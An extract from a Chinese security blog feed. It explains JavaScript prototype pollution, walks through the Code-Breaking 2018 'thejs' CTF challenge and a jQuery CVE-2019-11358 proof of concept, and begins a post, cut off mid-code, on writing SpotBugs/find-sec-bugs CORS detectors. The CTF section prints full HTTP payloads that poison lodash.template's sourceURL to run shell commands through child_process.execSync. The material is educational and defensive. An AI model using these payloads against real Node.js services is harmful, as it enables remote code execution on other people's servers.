Trump</span></span><br></pre></td></tr></table></figure><p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>考虑以下情况，如果使用<code>son.__proto__.name=&quot;son&quot;</code>，那么会造成<code>daughter.name=son</code></p><p><img src="/JS-原型链污染/uml.svg" alt="uml"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// son是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;<span class="attr">name</span>: <span class="string">"mike"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// son.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改son的原型（即Object）</span></span><br><span class="line">son.__proto__.name = <span class="string">"poison"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> daughter = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看daughter.name(daughter.name="poison")</span></span><br><span class="line"><span class="built_in">console</span>.log(daughter.name)</span><br></pre></td></tr></table></figure><p><code>foo.__proto__==zoo.__proto__==object</code></p><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><p>js中的merge、clone操作：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>失败的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p>成功的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p><strong>解释:</strong><br>失败利用的<code>__proto__</code>实际上是使o2的<code>__proto__</code>为<code>{b:2}</code>，即<code>o2.__proto__={b:2}</code>，这样<code>for</code>遍历时指挥遍历<code>a,b</code>，而不会遍历到<code>__proto__</code>。</p><p><img src="/JS-原型链污染/1556024722140.png" alt="1556024722140"></p><p>成功方法的JSON.parse会使o2的<code>__proto__</code>为一个普通的键名称，所以在<code>let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)</code>后o2的原型是没有b属性的，而在merge后会将o2的原型（object）增加一个b属性。</p><p><img src="/JS-原型链污染/1556025479492.png" alt="1556025479492"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>参考p神出的<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js" target="_blank" rel="noopener">Code-Breaking 2018 Thejs</a> 题目：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//source</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>source，用户输入的body传入merge方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.merge(data, req.body)</span><br></pre></td></tr></table></figure></p><p>sink为<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数，举例子更好说明：</p><p><img src="/JS-原型链污染/1556109443518.png" alt="1556109443518"></p><p>Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>，例如：</p><p><img src="/JS-原型链污染/1556110289896.png" alt="1556110289896"></p><p>再解释一下attempt：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到attempt的输入参数是(func[,args])，考虑到js特性——假设function(arg1,arg2,arg3)定义的函数有三个参数，其调用时参数个数可以小于3，实际相当于<code>func.apply()</code>。</p><h2 id="有缺陷的Payload"><a href="#有缺陷的Payload" class="headerlink" title="有缺陷的Payload"></a>有缺陷的Payload</h2><p>根据上面的分析，可以通过原型污染到object，使options也有sourceURL属性，构造出如下的payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.70.138:8086</span><br><span class="line"><span class="attribute">Content-Length</span>: 198</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.70.138:8086</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.70.138:8086/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125;</span><br></pre></td></tr></table></figure><p>解释一下payload，<code>e=&gt;{return ...}</code>是ES6的匿名函数创建语法，相当于</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p><p>执行结果如下</p><p><img src="/JS-原型链污染/1556111648655.png" alt="1556111648655"></p><p>注意，ping命令不能用，因为nodejs没有权限，Content-Type需要改为json（nodejs默认接受json格式）。</p><h2 id="优化payload"><a href="#优化payload" class="headerlink" title="优化payload"></a>优化payload</h2><p>上面的payload已经可以攻击成功，但是存在一个弊端就是在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务：</p><p><img src="/JS-原型链污染/1556973914607.png" alt="1556973914607"></p><p>需要用for循环把之前的污染删掉，这也就成了p神帖子里面的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\u000areturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>题外话，当时没想清楚为啥在return之前删除可以在后面删除污染，实际上是一个简单的先后问题，即在request的时候，我们污染了<code>sourceURL</code>，接着造成代码执行（先），在执行时，污染源被清除（后），返回系统命令执行结果，这样之后的调用就不会受到原型链污染的影响了。</p><h1 id="jQuery的原型污染-CVE-2019-11358"><a href="#jQuery的原型污染-CVE-2019-11358" class="headerlink" title="jQuery的原型污染(CVE-2019-11358)"></a>jQuery的原型污染(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11358" target="_blank" rel="noopener">CVE-2019-11358</a>)</h1><p>jQuery 3.4.0以下版本（不包括3.4.0）存在原型污染漏洞。主要原因可以参考奇安信代码卫士的“<a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a>”一文。</p><p>Sink出现在src/core.js代码jQuery.extend函数的<a href="https://github.com/jquery/jquery/blob/3.3.1/src/core.js#L155" target="_blank" rel="noopener">180-185行</a>：</p><p><img src="/JS-原型链污染/1557061047384.png" alt="1557061047384"></p><p>180行是一个递归调用，这里可以看到extend()参数有deep，clone，copy三个，接着<code>target[name]=copy</code>中，如果name和copy可控的话就可以进行污染了。</p><p>这两个变量当然是可控的，向上看到155-160行：</p><p><img src="/JS-原型链污染/1557061924872.png" alt="1557061924872"></p><p>arguments就是传进来的参数，先赋值给options，接着options的key就是name，value就是copy。</p><p>因此可以构造如下PoC：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>可以看到，之所以说jQuery原型污染的影响不大，是因为这是一个前端漏洞，即使有漏洞，攻击者也需要根据网站（源码审计）产生EXP，当然，如果网站依赖于某些类的某些属性/方法做身份验证或其他的什么事情（例如PoC里的devMode），那么后果还是很严重的。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p>JavaScript原型链污染，<a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p></li><li><p>深入理解 JavaScript Prototype 污染攻击，<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p></li><li><p>After three years of silence, a new jQuery prototype pollution vulnerability emerges once again，<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/</a></p></li><li><p>jQuery CVE-2019-11358 原型污染漏洞分析和修复建议, <a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177093</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;prototype和-proto&quot;&gt;&lt;a href=&quot;#prototype和-proto&quot; class=&quot;headerlink&quot; title=&quot;prototype和__proto__&quot;&gt;&lt;/a&gt;&lt;code&gt;prototype&lt;/code&gt;和&lt;code&gt;__proto__&lt;/code&gt;&lt;/h1&gt;&lt;h2 id=&quot;prototype&quot;&gt;&lt;a href=&quot;#prototype&quot; class=&quot;headerlink&quot; title=&quot;prototype&quot;&gt;&lt;/a&gt;&lt;code&gt;prototype&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;Javascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：&lt;/p&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Foo&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.bar = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Foo.prototype.show = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;show&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.bar)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; foo = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Foo()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;foo.show()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Web安全-JavaScript" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://anemone.top/tags/JavaScript/"/>
    
      <category term="jQuery" scheme="http://anemone.top/tags/jQuery/"/>
    
      <category term="原型链污染" scheme="http://anemone.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>spotbugs源码学习&amp;添加安全规则</title>
    <link href="http://anemone.top/whitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99/"/>
    <id>http://anemone.top/whitebox-spotbugs添加安全规则/</id>
    <published>2019-05-01T01:27:49.000Z</published>
    <updated>2019-11-03T12:52:09.724Z</updated>
    
    <content type="html"><![CDATA[<p>因为帮我内推阿里的师傅告诉我以后可能要做源码审计的工作，先学习一下spotbugs和<a href="https://find-sec-bugs.github.io/" target="_blank" rel="noopener">find-sec-bugs</a>的扫描规则实现，并且尝试添加一个规则。</p><h1 id="添加扫描规则——添加一个Detector"><a href="#添加扫描规则——添加一个Detector" class="headerlink" title="添加扫描规则——添加一个Detector"></a>添加扫描规则——添加一个Detector</h1><p>添加扫描规则主要是继承Detector，本文介绍以下几种主要的Detector：</p><a id="more"></a><h2 id="OpcodeStackDetector"><a href="#OpcodeStackDetector" class="headerlink" title="OpcodeStackDetector"></a>OpcodeStackDetector</h2><p>检查每一个Java虚拟机操作码（继承其中的<code>sawOpcode(int seen)</code>，<code>seen</code>即操作吗int表示），其中可以获取调用的方法名——<code>getNameConstantOperand()</code>，获取调用者——<code>getClassConstantOperand()</code>，获取函数调用的参数——<code>stack.getStackItem(0)</code>。可以做类似于正则匹配的简单扫描工具。</p><p>例如扫描<code>registry.addMapping.addMapping(&quot;/**&quot;).allowedOrigins(&quot;*&quot;)</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">OpcodeStackDetector</span> </span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sawOpcode</span><span class="params">(<span class="keyword">int</span> seen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检测调用方法名</span></span><br><span class="line">        <span class="keyword">if</span> (seen == Const.INVOKEVIRTUAL &amp;&amp; getNameConstantOperand().equals(<span class="string">"allowedOrigins"</span>)) &#123;</span><br><span class="line">            <span class="comment">// 检测调用对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"org/springframework/web/servlet/config/annotation/CorsRegistration"</span>.equals(getClassConstantOperand())) &#123;</span><br><span class="line">                OpcodeStack.Item item = stack.getStackItem(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 因为allowedOrigins参数时Strings... 所以不能直接提取而需要自己通过字节码提取</span></span><br><span class="line">                <span class="keyword">if</span>(item.isArray()) &#123;</span><br><span class="line">                    String[] strings=getStringArray(item);</span><br><span class="line">                    String pattern=<span class="string">"*"</span>;</span><br><span class="line">                    <span class="keyword">for</span> (String s: strings) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (s.equals(pattern)) &#123;</span><br><span class="line">                             bugReporter.reportBug(<span class="keyword">new</span> BugInstance(<span class="keyword">this</span>, <span class="string">"PERMISSIVE_CORS"</span>, HIGH_PRIORITY)</span><br><span class="line">                        .addClassAndMethod(<span class="keyword">this</span>).addSourceLine(<span class="keyword">this</span>));</span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是我为find-sec-bugs提交的一个真实的Detector，其中有一个坑就是<code>allowedOrigins()</code>方法的参数是变长参数（实际上是一个数组），如果参数是String或是定长参数的话，直接用<code>stack.getStackItem(0)</code>就可以拿到参数了，现在的话就需要自己写<code>getStringArray(item)</code>方法，具体解决代码见<a href="https://github.com/find-sec-bugs/find-sec-bugs/pull/472" target="_blank" rel="noopener">find-sec-bugs#472</a></p><h2 id="BasicInjectionDetector"><a href="#BasicInjectionDetector" class="headerlink" title="BasicInjectionDetector"></a>BasicInjectionDetector</h2><p>该Detector以每次调用（invoke）为单位进行代码审计，通过污点传播技术，判断调用敏感函数时判断参数是否为用户可控（可以参考com.h3xstream.findsecbugs.file.PathTraversalDetector.java）</p><p>也可继承后重写getInjectionPoint()和getPriorityFromTaintFrame()方法，直接判断是否存在调用以及判断风险等级，这时退化成OpcodeStackDetector，例如，我们要检测CORS漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">BasicInjectionDetector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERMISSIVE_CORS = <span class="string">"PERMISSIVE_CORS"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CORS_REGISTRY_CLASS = <span class="string">"org.springframework.web.servlet.config.annotation.CorsRegistration"</span>;</span><br><span class="line">    <span class="comment">// 需要获取函数原型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> InvokeMatcherBuilder CORS_REGISTRY_ALLOWED_ORIGINS_METHOD = invokeInstruction()</span><br><span class="line">            .atClass(CORS_REGISTRY_CLASS).atMethod(<span class="string">"allowedOrigins"</span>)</span><br><span class="line">            .withArgs(<span class="string">"([Ljava/lang/String;)Lorg/springframework/web/servlet/config/annotation/CorsRegistration;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CorsRegistryCORSDetector</span><span class="params">(BugReporter bugReporter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bugReporter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 每次调用时都会用该函数判断是否存在漏洞</span></span><br><span class="line"><span class="comment">     * invoke：表示一次调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> InjectionPoint <span class="title">getInjectionPoint</span><span class="params">(InvokeInstruction invoke, ConstantPoolGen cpg,</span></span></span><br><span class="line"><span class="function"><span class="params">            InstructionHandle 